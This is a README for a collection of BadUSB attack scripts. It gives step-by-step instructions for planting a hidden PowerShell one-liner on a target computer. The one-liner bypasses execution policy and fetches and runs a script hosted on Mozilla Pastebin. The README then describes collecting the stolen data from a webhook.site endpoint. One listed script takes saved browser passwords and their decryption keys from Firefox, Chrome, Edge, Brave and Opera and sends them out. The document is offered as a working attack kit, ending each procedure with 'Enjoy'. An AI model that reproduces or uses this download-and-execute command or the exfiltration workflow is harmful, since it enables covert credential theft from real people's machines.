# BadUSB Scripts
## How to Use
### Scripts With Extraction
1. Generate [Webhook.site](https://webhook.site/) page
2. Create New PGP Key
	- UID based on the [Webhook.site](https://webhook.site/) generated page and email address
	- Use RSA only as PSPGP doesn't support ECC yet
	- Publish public key on [keys.openpgp.org](https://keys.openpgp.org/) and validate the process
3. Edit the script to add the public key and [Webhook.site](https://webhook.site/) link
5. Paste the script on [Mozilla Pastebin](https://pastebin.mozilla.org/)
6. Make a one liner that will be run in the target's Run window through the BadUSB device
	- `PowerShell -w h -NoP -NonI -Exec Bypass $R = iwr https://pastebin.mozilla.org/<SNIPPET_CODE>/raw ; invoke-expression $R.Content`
7. Run the attack
8. Grab the extracted file from [Webhook.site](https://webhook.site/)
9. Decrypt extracted file with the previously created PGP Key
10. Enjoy
### Scripts Without Extraction
1. Paste the script on [Mozilla Pastebin](https://pastebin.mozilla.org/)
2. Make a one liner that will be run in the target's Run window through the BadUSB device
	- `PowerShell -w h -NoP -NonI -Exec Bypass $R = iwr https://pastebin.mozilla.org/<SNIPPET_CODE>/raw ; invoke-expression $R.Content`
3. Run the attack
10. Enjoy
## Scripts
### [browser_passwords](browser_passwords.ps1)
Grabs the encrypted passwords from Firefox, Google Chrome, Edge, Brave, Opera and Opera GX as well as the keys to decrypt them, then encrypts and extracts all the data to a webhook.